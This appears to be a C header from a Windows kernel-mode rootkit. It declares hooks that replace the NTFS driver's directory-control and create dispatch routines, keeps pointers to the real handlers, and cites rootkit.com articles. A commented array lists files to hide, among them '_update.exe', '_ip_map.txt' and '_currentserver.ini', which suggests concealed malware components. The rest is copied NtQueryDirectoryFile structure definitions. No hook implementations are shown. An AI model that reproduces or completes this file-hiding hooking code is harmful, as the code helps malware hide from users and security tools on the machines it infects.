#include "ntifs.h"
//NtQueryDirectoryFile structures

//FileDirectoryInformation

//struct in ntifs.h
/*
typedef struct _FILE_DIRECTORY_INFORMATION {
  ULONG  NextEntryOffset;
  ULONG  FileIndex;
  LARGE_INTEGER  CreationTime;
  LARGE_INTEGER  LastAccessTime;
  LARGE_INTEGER  LastWriteTime;
  LARGE_INTEGER  ChangeTime;
  LARGE_INTEGER  EndOfFile;
  LARGE_INTEGER  AllocationSize;
  ULONG  FileAttributes;
  ULONG  FileNameLength;
  WCHAR  FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;


//FileFullDirectoryInformation

typedef struct _FILE_FULL_DIR_INFORMATION {
  ULONG  NextEntryOffset;
  ULONG  FileIndex;
  LARGE_INTEGER  CreationTime;
  LARGE_INTEGER  LastAccessTime;
  LARGE_INTEGER  LastWriteTime;
  LARGE_INTEGER  ChangeTime;
  LARGE_INTEGER  EndOfFile;
  LARGE_INTEGER  AllocationSize;
  ULONG  FileAttributes;
  ULONG  FileNameLength;
  ULONG  EaSize;
  WCHAR  FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

//FileBothDirectoryInformation

typedef struct _FILE_BOTH_DIR_INFORMATION {
  ULONG  NextEntryOffset;
  ULONG  FileIndex;
  LARGE_INTEGER  CreationTime;
  LARGE_INTEGER  LastAccessTime;
  LARGE_INTEGER  LastWriteTime;
  LARGE_INTEGER  ChangeTime;
  LARGE_INTEGER  EndOfFile;
  LARGE_INTEGER  AllocationSize;
  ULONG  FileAttributes;
  ULONG  FileNameLength;
  ULONG  EaSize;
  CCHAR  ShortNameLength;
  WCHAR  ShortName[12];
  WCHAR  FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

//FileNamesInformation

typedef struct _FILE_NAMES_INFORMATION {
  ULONG  NextEntryOffset;
  ULONG  FileIndex;
  ULONG  FileNameLength;
  WCHAR  FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;
*/ 
/*
http://www.rootkit.com/newsread_print.php?newsid=690
http://www.rootkit.com/newsread.php?newsid=647
http://msdn2.microsoft.com/en-us/library/ms795825.aspx
http://msdn2.microsoft.com/en-us/library/ms795806.aspx
*/


//NtfsFsdDirectoryControl 
NTSTATUS MyNtfsFsdDirectoryControl (
									IN PDEVICE_OBJECT DeviceObject,
									IN PIRP  Irp
									);

NTSTATUS (* pRealNtfsFsdDirectoryControl) (
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP  Irp
	);


//NtfsFsdCreate
NTSTATUS MyNtfsFsdCreate (
						  IN PDEVICE_OBJECT DeviceObject,
						  IN PIRP  Irp
						  );

NTSTATUS (* pRealNtfsFsdCreate) (
								 IN PDEVICE_OBJECT DeviceObject,
								 IN PIRP  Irp
								 );

#define NTFS L"\\filesystem\\ntfs"

//char pHideFile[4][20]={"\\_update.exe","\\_ip_map.txt","\\_mfc71.dll","\\_currentserver.ini"};

//__declspec(dllimport) POBJECT_TYPE *IoDriverObjectType; //type export?par le noyau

#pragma LOCKEDCODE
PDRIVER_OBJECT DrvNtfsObj;